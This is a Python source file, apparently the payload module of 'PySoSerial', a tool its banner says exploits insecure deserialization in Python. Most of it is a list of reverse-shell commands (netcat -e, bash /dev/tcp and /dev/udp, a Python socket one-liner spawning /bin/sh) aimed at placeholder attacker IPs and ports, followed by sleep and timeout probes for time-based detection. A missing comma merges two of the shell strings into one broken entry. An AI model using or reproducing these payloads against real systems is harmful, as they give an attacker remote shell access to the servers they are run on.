


banner = """


██████╗░██╗░░░██╗░██████╗░█████╗░░██████╗███████╗██████╗░██╗░█████╗░██╗
██╔══██╗╚██╗░██╔╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██║██╔══██╗██║
██████╔╝░╚████╔╝░╚█████╗░██║░░██║╚█████╗░█████╗░░██████╔╝██║███████║██║
██╔═══╝░░░╚██╔╝░░░╚═══██╗██║░░██║░╚═══██╗██╔══╝░░██╔══██╗██║██╔══██║██║
██║░░░░░░░░██║░░░██████╔╝╚█████╔╝██████╔╝███████╗██║░░██║██║██║░░██║███████╗
╚═╝░░░░░░░░╚═╝░░░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚══════╝
                                                                                                        

[+] Tool for identification and exploitation of insecure deserialization vulnerabilities in python

"""


reverse_shells = [
"nc -e /bin/sh ip_placeholder port_placeholder",              # netcat
"nc -e /bin/bash ip_placeholder port_placeholder",
"nc -c bash ip_placeholder port_placeholder",
"bash -i >& /dev/tcp/ip_placeholder/port_placeholder 0>&1",   # bash TCP
"/bin/bash -l > /dev/tcp/ip_placeholder/port_placeholder 0<&1 2>&1",
"sh -i >& /dev/udp/ip_placeholder/port_placeholder 0>&1"      # bash UDP
"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip_placeholder\",port_placeholder));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
]


sleep_nix = [
    "sleep 2",
    "sleep 3",
    "sleep 4",
    "sleep 5",
]

sleep_win = [
    "timeout 2",
    "timeout 3",
    "timeout 4",
    "timeout 5",
]